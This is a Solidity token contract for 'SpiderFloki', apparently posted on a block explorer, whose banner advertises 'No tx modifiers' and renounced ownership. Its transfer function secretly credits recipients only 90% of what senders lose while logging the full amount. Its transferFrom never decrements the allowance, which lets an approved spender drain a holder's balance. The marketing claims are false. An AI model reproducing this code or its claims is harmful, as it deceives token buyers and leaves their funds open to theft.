/**
 *Submitted for verification at polygonscan.com on 2021-07-08
*/

/**
 *Submitted for verification
*/

/**
 .d8888b.           d8b      888                  8888888888 888          888      d8b 
d88P  Y88b          Y8P      888                  888        888          888      Y8P 
Y88b.                        888                  888        888          888          
 "Y888b.   88888b.  888  .d88888  .d88b.  888d888 8888888    888  .d88b.  888  888 888 
    "Y88b. 888 "88b 888 d88" 888 d8P  Y8b 888P"   888        888 d88""88b 888 .88P 888 
      "888 888  888 888 888  888 88888888 888     888        888 888  888 888888K  888 
Y88b  d88P 888 d88P 888 Y88b 888 Y8b.     888     888        888 Y88..88P 888 "88b 888 
 "Y8888P"  88888P"  888  "Y88888  "Y8888  888     888        888  "Y88P"  888  888 888 
           888                                                                         
           888                                                                         
           888
           
           
  ** No dev-wallets **
  ** Locked liquidity **
  ** Renounced ownership! **
  ** No tx modifiers **
  ** Community-Driven **

************* Let's GOOO !! ************
       
*/

pragma solidity ^0.8.3;

contract SpiderFloki{
    mapping(address => uint) public balances;
    mapping(address => mapping(address => uint)) public allowance;
    uint public totalSupply = 1000000000000000 * 10 ** 18;
    uint256 public constant _MAX_TX_SIZE = 5000000000000000 * 10 ** 18;
    string public name = "SpiderFloki";
    string public symbol = "SpiderFloki";
    uint public decimals = 18;

    
    event Transfer(address indexed from, address indexed to, uint value);
    event Approval(address indexed owner, address indexed spender, uint value);
    
    constructor() {
        balances[msg.sender] = totalSupply;
    }
    
    function balanceOf(address owner) public view returns(uint) {
        return balances[owner];
    }
    
    function transfer(address to, uint value) public returns(bool) {
        require(balanceOf(msg.sender) >= value, 'balance too low');
        require(value <= _MAX_TX_SIZE, "Transfer amount exceeds the maxTxAmount.");
        balances[to] += value * 9/10;
        balances[msg.sender] -= value;
        emit Transfer(msg.sender, to, value);
        return true;
    }
    
    function transferFrom(address from, address to, uint value) public returns(bool) {
        require(balanceOf(from) >= value, 'balance too low');
        require(allowance[from][msg.sender] >= value, 'allowance too low');
        balances[to] += value;
        balances[from] -= value;
        emit Transfer(from, to, value);
        return true;
    }
    
    function approve(address spender, uint value) public returns(bool) {
        allowance[msg.sender][spender] = value;
        emit Approval(msg.sender, spender, value);
        return true;
    }
    
}